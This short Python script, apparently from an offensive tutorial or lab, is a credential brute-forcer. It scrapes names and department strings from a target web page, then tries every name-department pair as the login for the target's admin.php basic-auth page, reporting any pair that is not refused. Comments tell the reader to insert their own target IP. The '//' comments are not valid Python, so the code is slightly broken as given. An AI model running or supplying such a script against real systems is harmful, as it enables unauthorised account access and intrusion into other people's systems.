def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print ("\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n")

page = downloadPage("http://xxx.xxx.xxx.xxx") //include the Target IP address

names = findNames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print ("[+] Working... ")
for name in uniqNames:
    for dept in uniqDepts:
        getAuthorized("http://xxx.xxx.xxx.xxx/admin.php", name, dept) //replace the "xxx.xx.xxx.xx" with your target IP address
